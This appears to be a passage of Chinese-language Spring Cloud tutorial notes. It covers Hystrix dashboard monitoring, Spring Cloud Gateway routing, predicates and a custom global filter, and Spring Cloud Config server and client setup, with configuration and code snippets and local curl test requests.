<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix-dashboard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9001</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableHystrixDashboard</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HystrixDashboardMain9001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(HystrixDashboardMain9001.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210131160327319.png" alt="image-20210131160327319"></p>
<h3 id="被监控"><a href="#被监控" class="headerlink" title="被监控"></a>被监控</h3><ul>
<li><p>被监控服务需要导入 actuator </p>
</li>
<li><p>主启动类加上配置</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@EnableCircuitBreaker</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentHystrixMain8001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(PaymentHystrixMain8001.class,args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *此配置是为了服务监控而配置，与服务容错本身无关，springcloud升级后的坑</span></span><br><span class="line"><span class="comment">     *ServletRegistrationBean因为springboot的默认路径不是&quot;/hystrix.stream&quot;，</span></span><br><span class="line"><span class="comment">     *只要在自己的项目里配置上下面的servlet就可以了</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServletRegistrationBean <span class="title">getServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        HystrixMetricsStreamServlet streamServlet = <span class="keyword">new</span> HystrixMetricsStreamServlet();</span><br><span class="line">        ServletRegistrationBean registrationBean = <span class="keyword">new</span> ServletRegistrationBean(streamServlet);</span><br><span class="line">        registrationBean.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        registrationBean.addUrlMappings(<span class="string">&quot;/hystrix.stream&quot;</span>);</span><br><span class="line">        registrationBean.setName(<span class="string">&quot;HystrixMetricsStreamServlet&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> registrationBean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动一个eureka或eureka集群，9001监控8001，填写监控地址</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20210131160924167.png" alt="image-20210131160924167"></p>
<ul>
<li><a href="http://localhost:8001/payment/circuit/11">http://localhost:8001/payment/circuit/11</a></li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20210131161113450.png" alt="image-20210131161113450"></p>
<ul>
<li><a href="http://localhost:8001/payment/circuit/-1">http://localhost:8001/payment/circuit/-1</a></li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20210131161145648.png" alt="image-20210131161145648"></p>
<p><img src="https://csn.damyoung.cn/image-20210131161223417.png" alt="image-20210131161223417"></p>
<p><img src="https://csn.damyoung.cn/image-20210131161251367.png" alt="image-20210131161251367"></p>
<p><img src="https://csn.damyoung.cn/image-20210131161306629.png" alt="image-20210131161306629"></p>
<h1 id="服务网关"><a href="#服务网关" class="headerlink" title="服务网关"></a>服务网关</h1><h2 id="zuul"><a href="#zuul" class="headerlink" title="zuul"></a>zuul</h2><h2 id="gateway"><a href="#gateway" class="headerlink" title="gateway"></a>gateway</h2><p>目标提供统一的路由方式且基于Fiter链的方式提供了网关基本的功能，例如安全，监控/指标，限流</p>
<p>SpringCloud Gateway 使用的Webflux中的reactor-netty响应式编程组件，底层使用了Netty通讯框架</p>
<p>反向代理，鉴权，流量控制，熔断，日志监控</p>
<p><img src="https://csn.damyoung.cn/image-20210131162234865.png" alt="image-20210131162234865"></p>
<p>异步非阻塞模型</p>
<p><img src="https://csn.damyoung.cn/image-20210131162442894.png" alt="image-20210131162442894"></p>
<p><img src="C:%5CUsers%5Cadmin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210131162636791.png" alt="image-20210131162636791"></p>
<h3 id="三大核心"><a href="#三大核心" class="headerlink" title="三大核心"></a>三大核心</h3><p>路由：路由是构建网关的基本模块，它由ID，目标URI，一系列断言和过滤器组成，如果断言为true则匹配该路由</p>
<p>断言predicate：参考jdk8的java.util.function.Predicate开发人员可以匹配http请求中的所有内容(请求头或请求参数)，如果请求与断言相匹配进行路由</p>
<p>过滤filter：指的是spring框架中gatewayFilter的实例，使用过滤器，可以在请求被路由前或者之后对请求进行修改</p>
<p><img src="https://csn.damyoung.cn/image-20210131163241209.png" alt="image-20210131163241209"></p>
<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>路由转发+执行过滤器链</p>
<p><img src="https://csn.damyoung.cn/image-20210131163429189.png" alt="image-20210131163429189"></p>
<p><img src="https://csn.damyoung.cn/image-20210131163439079.png" alt="image-20210131163439079"></p>
<h3 id="入门配置"><a href="#入门配置" class="headerlink" title="入门配置"></a>入门配置</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--gateway--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--eureka-client--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Cloud-gateway</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">cloud-gateway-service</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GatewayMain9527</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(GatewayMain9527.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="9527网关配置"><a href="#9527网关配置" class="headerlink" title="9527网关配置"></a>9527网关配置</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Cloud-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh</span> <span class="comment">#路由的id,没有固定规则但要求唯一,建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span> <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/get/**</span> <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh2</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/lb/**</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210131170644311.png" alt="image-20210131170644311"></p>
<p><img src="https://csn.damyoung.cn/image-20210131170945062.png" alt="image-20210131170945062"></p>
<p><img src="https://csn.damyoung.cn/image-20210131170956754.png" alt="image-20210131170956754"></p>
<h3 id="网关俩种配置"><a href="#网关俩种配置" class="headerlink" title="网关俩种配置"></a>网关俩种配置</h3><ol>
<li><p>yml，如上</p>
</li>
<li><p>注入bean</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GatewayConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RouteLocator <span class="title">customRouteLocator</span><span class="params">(RouteLocatorBuilder routeLocatorBuilder)</span></span>&#123;</span><br><span class="line">        RouteLocatorBuilder.Builder routes = routeLocatorBuilder.routes();</span><br><span class="line">        routes.route(<span class="string">&quot;path_route1&quot;</span>,</span><br><span class="line">                r-&gt; r.path(<span class="string">&quot;/guonei&quot;</span>)</span><br><span class="line">                        .uri(<span class="string">&quot;http://news.baidu.com/guonei&quot;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> routes.build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210131171849431.png" alt="image-20210131171849431"></p>
<p><img src="https://csn.damyoung.cn/image-20210131171856957.png" alt="image-20210131171856957"></p>
<h3 id="微服务名实现动态路由"><a href="#微服务名实现动态路由" class="headerlink" title="微服务名实现动态路由"></a>微服务名实现动态路由</h3><p>默认情况下Gateway会根据注册中心注册的服务列表，以注册中心上微服务名为路径创建动态路由进行转发，从而实现动态路由的功能</p>
<p>通过微服务名，服务负载均衡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: <span class="number">9527</span></span><br><span class="line">spring:</span><br><span class="line">  application:</span><br><span class="line">    name: Cloud-gateway</span><br><span class="line">  cloud:</span><br><span class="line">    gateway:</span><br><span class="line">#      开启从注册中心动态创建路由的功能，利用 微服务名 进行路由</span><br><span class="line">      discovery:</span><br><span class="line">        locator:</span><br><span class="line">          enabled: <span class="keyword">true</span></span><br><span class="line">      routes:</span><br><span class="line">        - id: payment_routh #路由的id,没有固定规则但要求唯一,建议配合服务名</span><br><span class="line">#          uri: http://localhost:8001 #匹配后提供服务的路由地址</span><br><span class="line">          uri: lb:<span class="comment">//cloud-payment-service</span></span><br><span class="line">          predicates:</span><br><span class="line">            - Path=/payment/get<span class="comment">/** #断言，路径相匹配的进行路由</span></span><br><span class="line"><span class="comment">            </span></span><br><span class="line"><span class="comment">        - id: payment_routh2</span></span><br><span class="line"><span class="comment">#          uri: http://localhost:8001</span></span><br><span class="line"><span class="comment">          uri: lb://cloud-payment-service</span></span><br><span class="line"><span class="comment">          predicates:</span></span><br><span class="line"><span class="comment">            - Path=/payment/lb/**</span></span><br><span class="line"><span class="comment">#              开启动态路由</span></span><br><span class="line"><span class="comment">eureka:</span></span><br><span class="line"><span class="comment">  instance:</span></span><br><span class="line"><span class="comment">    hostname: cloud-gateway-service</span></span><br><span class="line"><span class="comment">  client:</span></span><br><span class="line"><span class="comment">    register-with-eureka: true</span></span><br><span class="line"><span class="comment">    fetch-registry: true</span></span><br><span class="line"><span class="comment">    service-url:</span></span><br><span class="line"><span class="comment">      defaultZone: http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210131180649911.png" alt="image-20210131180649911"></p>
<p><img src="https://csn.damyoung.cn/image-20210131180620736.png" alt="image-20210131180620736"></p>
<p><img src="https://csn.damyoung.cn/image-20210131180628156.png" alt="image-20210131180628156"></p>
<h3 id="Predicate"><a href="#Predicate" class="headerlink" title="Predicate"></a>Predicate</h3><p>Predicate就是为了实现一组匹配规则，让请求过来找到对应的Route进行处理</p>
<p><img src="https://csn.damyoung.cn/image-20210131180753194.png" alt="image-20210131180753194"></p>
<h4 id="After-Before-Between"><a href="#After-Before-Between" class="headerlink" title="After/Before/Between"></a>After/Before/Between</h4><blockquote>
<p>在设置时间之后才能访问</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210131194217153.png" alt="image-20210131194217153"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    System.out.println(ZonedDateTime.now());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#            - Before=2021-01-31T19:42:00.569+08:00[Asia/Shanghai]</span></span><br><span class="line"><span class="comment">#            - After=2021-01-31T19:42:00.569+08:00[Asia/Shanghai]</span></span><br><span class="line"><span class="comment">#            - Between=2021-01-31T19:42:00.569+08:00[Asia/Shanghai],2021-01-31T19:44:00.569+08:00[Asia/Shanghai]</span></span><br></pre></td></tr></table></figure>

<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><blockquote>
<p>curl作为测试</p>
<p><a href="http://localhost:9527/payment/get/31">http://localhost:9527/payment/get/31</a> –cookie “username=zzyy”</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210131194601805.png" alt="image-20210131194601805"></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">Cookie=username,zzyy</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210131195306258.png" alt="image-20210131195306258"></p>
<h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">Header=X-Request-Id,</span> <span class="string">\d+</span> <span class="comment">#请求头要有X-Request-Id属性并且值为整数的正则表达式</span></span><br><span class="line"></span><br><span class="line"><span class="string">curl</span> <span class="string">http://localhost:9527/payment/lb</span> <span class="string">-H</span> <span class="string">&quot;X-Request-Id:123&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>路由过滤器可用于修改进入的http请求和返回的http响应，路由过滤器只能指定路由进行使用，SpringCloud Gateway内置了多种路由过滤器，他们都由GatewayFilter工厂类产生</p>
<p><strong>生命周期：</strong>pre、post</p>
<p><strong>种类：</strong>GatewayFilter、GlobalFilter (n种)</p>
<h4 id="自定义全局过滤器"><a href="#自定义全局过滤器" class="headerlink" title="自定义全局过滤器"></a>自定义全局过滤器</h4><blockquote>
<p>全局日志记录，统一网关鉴权</p>
<p>implements GlobalFilter,Ordered</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLogGatewayFilter</span> <span class="keyword">implements</span> <span class="title">GlobalFilter</span>, <span class="title">Ordered</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;come in==== MyLogGateWayFilter&quot;</span>+<span class="keyword">new</span> Date());</span><br><span class="line">        String uname = exchange.getRequest().getQueryParams().getFirst(<span class="string">&quot;uname&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (uname==<span class="keyword">null</span>)&#123;</span><br><span class="line">            log.info(<span class="string">&quot;====用户名为null,非法用户┭┮﹏┭┮&quot;</span>);</span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.NOT_ACCEPTABLE);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getOrder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210131202526177.png" alt="image-20210131202526177"></p>
<p><img src="https://csn.damyoung.cn/image-20210131202637738.png" alt="image-20210131202637738"></p>
<h1 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h1><h2 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h2><p>微服务意外着要将单体应用中的业务拆分成一个个子服务，每个服务的粒度相对较小，因此系统中会出现大量的服务。由于每个服务都需要必要的配置信息才能运行，所以一套集中式的、动态的配置管理设施是必不可少的。</p>
<p>SpringCloud Config为微服务架构中的微服务提供集中化的外部配置支持，配置服务器为各个不同微服务应用的所有环境提供了一个中心化的外部配置</p>
<p><img src="https://csn.damyoung.cn/image-20210131205040760.png" alt="image-20210131205040760"></p>
<p> SpringCloud Config分为服务端和客户端</p>
<p>服务端也称为分布式配置中心，它是一个独立的微服务应用，用来连接配置服务器并为客户端提供配置信息，加密/解密信息等访问接口</p>
<p>客户端则是通过指定的配置中心来管理应用资源，以及与业务相关的配置内容，并在启动的时候从配置中心获取和加载配置信息配置服务器默认采用git来存储配置信息，这样就有助于对环境配置进行版本管理，并且可以通过git客户端工具来方便的管理和访问配置内容</p>
<p><strong>作用</strong></p>
<ul>
<li><p>集中管理配置文件</p>
</li>
<li><p>不同环境不同配置，动态化的配置更新，分环境部署比如dev/test/prod/bata/release</p>
</li>
<li><p>运行期间动态调整配置，不再需要在每个服务部署的机器上编写配置文件，服务会向配置中心统一拉取配置自己的信息</p>
</li>
<li><p>当配置发生变化时，服务不需要重启即可感知到配置的变化并应用新的配置</p>
</li>
<li><p>将配置信息以rest接口的形式暴露(post/curl访问刷新即可)</p>
</li>
</ul>
<p>SpringCloud Config默认使用git来存储配置文件,使用的是http/https访问的形式</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>创建github repository</p>
<p><img src="https://csn.damyoung.cn/image-20210131212121409.png" alt="image-20210131212121409"></p>
<p><img src="https://csn.damyoung.cn/image-20210131212224156.png" alt="image-20210131212224156"></p>
<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>创建配置中心模块cloud-config-center-3344，即为cloud配置中心模块cloudConfig Center</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        config配置server服务端--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-config-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3344</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span>  <span class="string">cloud-config-center</span> <span class="comment">#注册进Eureka服务器的微服务名</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">git:</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">git@github.com:dmYang-only/springcloud-config.git</span> <span class="comment">#GitHub上面的git仓库名字</span></span><br><span class="line">          <span class="comment">####搜索目录</span></span><br><span class="line">          <span class="attr">search-paths:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">springcloud-config</span></span><br><span class="line">      <span class="comment">####读取分支</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableConfigServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigCenterMain3344</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ConfigCenterMain3344.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210131215953415.png" alt="image-20210131215953415"></p>
<p><img src="https://csn.damyoung.cn/image-20210131221758571.png" alt="image-20210131221758571"></p>
<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>cloud-config-client-3355,创建<code>bootstrap.yml</code>配置文件</p>
<p><img src="https://csn.damyoung.cn/image-20210131222749789.png" alt="image-20210131222749789"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        config配置server服务端--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-config-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>bootstrap.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3355</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="comment">#Config客户端配置</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">main</span> <span class="comment">#分支名称</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">config</span> <span class="comment">#配置文件名称</span></span><br><span class="line">      <span class="attr">profile:</span> <span class="string">dev</span> <span class="comment">#读取后缀名称   上述3个综合：main分支上config-dev.yml的配置文件被读取http://config-3344.com:3344/main/config-dev.yml</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">http://localhost:3344</span> <span class="comment">#配置中心地址k</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigClientMain3355</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ConfigClientMain3355.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

